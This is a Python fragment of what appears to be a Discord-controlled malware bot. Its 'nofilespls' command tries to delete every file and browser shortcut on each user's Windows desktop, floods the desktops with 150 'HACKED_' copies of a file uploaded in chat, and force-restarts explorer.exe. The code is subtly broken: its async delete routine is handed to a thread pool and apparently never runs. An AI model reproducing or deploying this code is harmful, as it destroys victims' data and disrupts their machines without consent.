import os
import random
import string
import requests
import threading
import queue
import sys, shutil
import concurrent.futures
import subprocess
async def nofilespls(ctx):
    if not ctx.message.attachments:
        await ctx.send("Please upload a file.")
        return
    attachment = ctx.message.attachments[0]
    file_content = await attachment.read()
    file_extension = os.path.splitext(attachment.filename)[1]
    image_path = f"uploaded_file{file_extension}"
    with open(image_path, "wb") as file:
        file.write(file_content)
    desktop_folders = [os.path.join(root, "Desktop") for root, _, _ in os.walk(r"C:\Users") if os.path.exists(os.path.join(root, "Desktop"))]
    max_tasks = 10

    async def delete_file(file_path):
        try:
            if os.path.isfile(file_path): os.remove(file_path)
            elif os.path.isdir(file_path): shutil.rmtree(file_path)
        except: pass

    async def flood_and_clear():
        tasks = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_tasks) as executor:
            for folder in desktop_folders:
                try:
                    for item in os.listdir(folder):
                        item_path = os.path.join(folder, item)
                        if item.endswith(".lnk") and ("firefox" in item.lower() or "chrome" in item.lower()):
                            executor.submit(delete_file, item_path)
                        elif os.path.isfile(item_path):
                            executor.submit(delete_file, item_path)
                    for _ in range(150):
                        random_name = f'HACKED_{"".join(random.choices(string.ascii_uppercase, k=5))}{file_extension}'
                        random_file_path = os.path.join(folder, random_name)
                        executor.submit(shutil.copy, image_path, random_file_path)
                except: pass

    await flood_and_clear()
    try:
        subprocess.run("taskkill /im explorer.exe /f", shell=True)
        subprocess.run("start explorer.exe", shell=True)
    except: pass
    await ctx.send(f"desktop flooded with {file_extension}")